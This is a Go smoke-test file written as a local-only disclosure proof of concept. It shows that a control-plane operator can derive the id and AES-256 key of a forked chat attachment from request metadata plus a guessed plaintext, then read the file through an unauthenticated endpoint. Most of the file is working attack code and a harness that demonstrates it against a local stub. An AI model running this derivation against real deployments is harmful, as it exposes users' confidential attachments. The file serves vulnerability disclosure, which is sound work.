//go:build smoke

// Disclosure PoC (local only) for confidential-sync @ 4acbf16.
//
// The control plane (CP) operator can derive the id AND the AES-256 key of an
// attachment that the sync enclave copied during a chat fork, using only
// values the enclave sends to the CP plus a guessed plaintext. The derived
// id confirms the guess offline; the derived key opens the attachment through
// the unauthenticated POST /v1/attachment/get-public route.
//
// Drop this file into internal/localstack/smoke/ of an unmodified checkout and
// run:  go test -tags=smoke -run TestDisclosure12 -v -count=1 ./internal/localstack/smoke
//
// Nothing in the enclave is modified. The test assembles the same three
// listeners as localstack.Start (JWKS, the repo's StubCP, the real
// server.NewHandler) and only wraps the StubCP handler with a recorder, so
// the test can see exactly the requests a real control plane receives.
package smoke

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/MicahParks/keyfunc/v3"
	"golang.org/x/crypto/hkdf"

	"github.com/tinfoilsh/confidential-sync-enclave/internal/auth"
	"github.com/tinfoilsh/confidential-sync-enclave/internal/buckets"
	"github.com/tinfoilsh/confidential-sync-enclave/internal/controlplane"
	"github.com/tinfoilsh/confidential-sync-enclave/internal/crypto"
	"github.com/tinfoilsh/confidential-sync-enclave/internal/localstack"
	"github.com/tinfoilsh/confidential-sync-enclave/internal/server"
)

// ---------------------------------------------------------------------------
// Attacker code. Written from the published source; uses no secret and no
// enclave package. Mirrors attachment_ops.go:94-133 (deriveAttachmentMaterials,
// encodeIKM) and fork_ops.go:300-303 (forkAttachmentIdemKey).
// ---------------------------------------------------------------------------

func atkIKM(parts ...string) []byte {
	var buf []byte
	var l [8]byte
	for _, p := range parts {
		binary.BigEndian.PutUint64(l[:], uint64(len(p)))
		buf = append(append(buf, l[:]...), p...)
	}
	return buf
}

func atkDerive(idem, chatID, sub string, plaintext []byte) (string, []byte) {
	d := sha256.Sum256(plaintext)
	ikm := atkIKM(idem, chatID, sub, hex.EncodeToString(d[:]))
	id := make([]byte, 18)
	_, _ = io.ReadFull(hkdf.New(sha256.New, ikm, nil, []byte("tinfoil-attachment-id-v1")), id)
	key := make([]byte, 32)
	_, _ = io.ReadFull(hkdf.New(sha256.New, ikm, nil, []byte("tinfoil-attachment-key-v1")), key)
	return hex.EncodeToString(id), key
}

func atkForkIdem(forkIdem, srcAttID string, idx int) string {
	s := sha256.Sum256([]byte(fmt.Sprintf("fork-att:%s:%s:%d", forkIdem, srcAttID, idx)))
	return hex.EncodeToString(s[:16])
}

// getPublic calls the enclave with NO Authorization and NO X-Sync-Protocol.
func getPublic(t *testing.T, enclave, id string, key []byte) (int, []byte) {
	t.Helper()
	b, _ := json.Marshal(map[string]string{"id": id, "att_key": base64.StdEncoding.EncodeToString(key)})
	resp, err := http.Post(enclave+"/v1/attachment/get-public", "application/json", bytes.NewReader(b))
	if err != nil {
		t.Fatalf("get-public: %v", err)
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		return resp.StatusCode, raw
	}
	var out struct {
		Plaintext string `json:"plaintext"`
	}
	_ = json.Unmarshal(raw, &out)
	pt, _ := base64.StdEncoding.DecodeString(out.Plaintext)
	return 200, pt
}

// ---------------------------------------------------------------------------
// Test harness: localstack.Start with a request recorder on the CP listener.
// ---------------------------------------------------------------------------

type cpReq struct {
	Method, Path string
	Header       http.Header
	Body         []byte
}

type cpLog struct {
	mu   sync.Mutex
	reqs []cpReq
}

func (l *cpLog) wrap(h http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		r.Body = io.NopCloser(bytes.NewReader(body))
		l.mu.Lock()
		l.reqs = append(l.reqs, cpReq{r.Method, r.URL.RequestURI(), r.Header.Clone(), body})
		l.mu.Unlock()
		h.ServeHTTP(w, r)
	})
}

func (l *cpLog) all() []cpReq {
	l.mu.Lock()
	defer l.mu.Unlock()
	return append([]cpReq(nil), l.reqs...)
}

func serve(t *testing.T, h http.Handler) string {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	srv := &http.Server{Handler: h, ReadHeaderTimeout: 10 * time.Second}
	go func() { _ = srv.Serve(ln) }()
	t.Cleanup(func() { _ = srv.Close() })
	return "http://" + ln.Addr().String()
}

func startObservedStack(t *testing.T, log *cpLog) *localstack.Stack {
	t.Helper()
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		t.Fatal(err)
	}
	const kid = "local-stack-kid"
	pub := priv.Public().(*rsa.PublicKey)
	jwks, _ := json.Marshal(map[string]any{"keys": []any{map[string]any{
		"kty": "RSA", "use": "sig", "alg": "RS256", "kid": kid,
		"n": base64.RawURLEncoding.EncodeToString(pub.N.Bytes()),
		"e": base64.RawURLEncoding.EncodeToString(big.NewInt(int64(pub.E)).Bytes()),
	}}})
	jwksURL := serve(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write(jwks)
	}))

	cp := localstack.NewStubCP()
	cpURL := serve(t, log.wrap(cp)) // the only difference from localstack.Start

	kf, err := keyfunc.NewDefaultCtx(context.Background(), []string{jwksURL + "/.well-known/jwks.json"})
	if err != nil {
		t.Fatal(err)
	}
	verifier, err := auth.NewVerifierWithKeyfunc(auth.Config{Issuer: jwksURL}, kf)
	if err != nil {
		t.Fatal(err)
	}
	handler := server.NewHandler(server.Deps{
		Controlplane:      controlplane.NewClient(cpURL, &http.Client{Timeout: 10 * time.Second}, controlplane.WithServiceSecret(localstack.LocalStackSyncEnclaveSecret)),
		Buckets:           buckets.NewClient(cpURL, localstack.LocalStackBucketsBucket, &http.Client{Timeout: server.AttachmentRequestTimeout}),
		GitSHA:            "local-stack",
		SyncEnclaveSecret: localstack.LocalStackSyncEnclaveSecret,
	}, verifier)
	enclaveURL := serve(t, handler.Routes())
	return &localstack.Stack{EnclaveURL: enclaveURL, CPURL: cpURL, JWKSURL: jwksURL, CP: cp,
		SigningKey: priv, SigningKID: kid, Issuer: jwksURL}
}

func TestDisclosure12_ForkedAttachmentKeyDerivableByControlPlane(t *testing.T) {
	log := &cpLog{}
	stack := startObservedStack(t, log)

	// ---- Victim: an ordinary user, driven exactly as the webapp drives the enclave.
	const sub = "user_victim"
	tok, err := stack.MintJWT(sub, time.Hour)
	if err != nil {
		t.Fatal(err)
	}
	cek := make([]byte, crypto.KeySize)
	_, _ = rand.Read(cek) // CEK is random and never reaches the CP
	kidB, _ := crypto.DeriveKeyID(cek)
	f := &fixture{t: t, stack: stack, userSub: sub, jwt: tok, cek: cek,
		cekKID: crypto.KeyIDHex(kidB), cekB64: base64.StdEncoding.EncodeToString(cek)}
	if st, body, err := f.registerKey(randHex(16), "start_fresh"); err != nil {
		t.Fatalf("register: %d %s", st, body)
	}

	secretDoc := []byte(`{"textContent":"Lab result: HIV positive. Patient: J. Doe"}`)
	const chatID, forkID = "chat-victim-1", "chat-victim-1-branch"

	// Upload: webapp idempotency key = sha256("attachment:"+chat+":"+uuid+":"+b64(sha256(bytes)))[:16];
	// we use a random value here, it is not needed by the attacker.
	st, body := f.post("/v1/attachment/put", map[string]any{
		"chat_id": chatID, "plaintext": base64.StdEncoding.EncodeToString(secretDoc), "idempotency_key": randHex(16)})
	if st != 200 {
		t.Fatalf("attachment/put: %d %s", st, body)
	}
	var put struct {
		ID     string `json:"id"`
		AttKey string `json:"att_key"`
	}
	_ = json.Unmarshal(body, &put)
	chatJSON, _ := json.Marshal(map[string]any{"id": chatID, "title": "private", "createdAt": "2026-10-11T00:00:00.000Z",
		"isLocalOnly": false, "messages": []map[string]any{{"role": "user", "content": "see file",
			"timestamp": "2026-10-11T00:00:00.000Z", "attachments": []map[string]any{{"id": put.ID, "type": "document",
				"fileName": "result.txt", "mimeType": "text/plain", "encryptionKey": put.AttKey}}}}})
	if st, r := f.push("chat", chatID, chatJSON, nil, randHex(16)); st != 200 {
		t.Fatalf("push: %d %s", st, r.Raw)
	}
	// Fork ("branch conversation"): webapp sends a random 128-bit idempotency key.
	st, body = f.post("/v1/sync/fork", map[string]any{"source_id": chatID, "target_id": forkID, "key": f.cekB64,
		"message_count": 1, "title": "branch", "created_at": "2026-10-11T00:00:00Z", "idempotency_key": randHex(16)})
	if st != 200 {
		t.Fatalf("fork: %d %s", st, body)
	}

	// ---- Attacker = CP operator. Inputs: ONLY the recorded CP requests.
	var forkIdem, cpSub, srcAtt, newAtt string
	for _, r := range log.all() {
		if r.Method == "PUT" && r.Path == "/api/sync/blob/chat/"+forkID {
			forkIdem = r.Header.Get(controlplane.HeaderIdempotency)
			cpSub = r.Header.Get(controlplane.HeaderClerkUserID)
		}
		if r.Method == "POST" && strings.HasPrefix(r.Path, "/api/sync/attachment-index/") {
			var b struct {
				ChatID string `json:"chat_id"`
			}
			_ = json.Unmarshal(r.Body, &b)
			id := strings.TrimPrefix(r.Path, "/api/sync/attachment-index/")
			switch b.ChatID {
			case chatID:
				srcAtt = id
			case forkID:
				newAtt = id
			}
		}
	}
	if forkIdem == "" || cpSub == "" || srcAtt == "" || newAtt == "" {
		t.Fatalf("CP observation incomplete")
	}
	t.Logf("CP saw: PUT /api/sync/blob/chat/%s X-Idempotency-Key=%s X-Clerk-User-Id=%s; attachment-index src=%s fork=%s",
		forkID, forkIdem, cpSub, srcAtt, newAtt)

	// Offline dictionary test. No enclave call.
	candidates := [][]byte{
		[]byte(`{"textContent":"Lab result: HIV negative. Patient: J. Doe"}`),
		[]byte(`{"textContent":"Lab result: HIV positive. Patient: J. Doe"}`),
		[]byte(`{"textContent":"Lab result: inconclusive. Patient: J. Doe"}`),
	}
	idem := atkForkIdem(forkIdem, srcAtt, 0)
	var hitKey []byte
	var hit []byte
	for _, c := range candidates {
		id, key := atkDerive(idem, forkID, cpSub, c)
		match := id == newAtt
		t.Logf("offline guess %q -> id %s match=%v", c, id, match)
		if match {
			hitKey, hit = key, c
		}
	}
	if hitKey == nil {
		t.Fatalf("no candidate matched")
	}
	t.Logf("RESULT offline: CP confirmed forked attachment %s content without any user secret", newAtt)

	// Unauthenticated read with the derived key.
	st, got := getPublic(t, stack.EnclaveURL, newAtt, hitKey)
	if st != 200 || !bytes.Equal(got, hit) {
		t.Fatalf("get-public: %d %q", st, got)
	}
	t.Logf("RESULT get-public (no Authorization header) with CP-derived key: 200 %q", got)

	// ---- Negative controls.
	_, wrongKey := atkDerive(idem, forkID, cpSub, candidates[0])
	st, wb := getPublic(t, stack.EnclaveURL, newAtt, wrongKey)
	if st == 200 {
		t.Fatalf("wrong key decrypted")
	}
	t.Logf("CONTROL wrong-guess key -> %d %s", st, strings.TrimSpace(string(wb)))
}

func randHex(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}
